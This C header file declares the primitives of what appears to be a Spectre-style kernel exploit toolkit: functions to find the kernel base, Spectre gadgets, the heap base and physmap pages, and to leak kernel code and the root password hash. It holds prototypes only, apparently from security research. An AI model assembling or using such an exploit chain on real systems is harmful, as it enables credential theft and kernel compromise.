#ifndef _PRIMITIVES_H_
#define _PRIMITIVES_H_

void init_specex_leaks();
void close_specex_leaks();

// Code Probing
unsigned long find_kernel_image();

// Gadget Probing
unsigned long find_spectre_gadget(unsigned long kernel_base);

// Data Probing
unsigned long find_heap_base_2deref(unsigned long kernel_base_address);
unsigned long find_heap_base_spectre(unsigned long spectre_gadget_address);

// Object Probing
unsigned long find_oob_write_location_3deref(unsigned long kernel_base_address,
    unsigned long heap_base);

// Spectre Probing
unsigned long find_user_page_in_physmap(unsigned long user_page,
    unsigned long user_page_size, unsigned long heap_base,
    unsigned long gadget_addr, unsigned long kernel_base);
void leak_root_password_hash(unsigned long spectre_gadget_addr,
    unsigned long heap_base, unsigned long user_page,
    unsigned long physmap_page);
unsigned long find_spectre_gadget_start(unsigned long spectre_gadget_addr,
    unsigned long kernel_base, unsigned long code_size, unsigned long user_page,
    unsigned long physmap_page);
void leak_kernel_code(unsigned long spectre_gadget_addr,
    unsigned long kernel_base, unsigned long code_size, unsigned long user_page,
    unsigned long physmap_page);
void get_kernel_code_bytes(char** kernel_code_bytes, unsigned long* code_size);

#endif /* _PRIMITIVES_H_ */
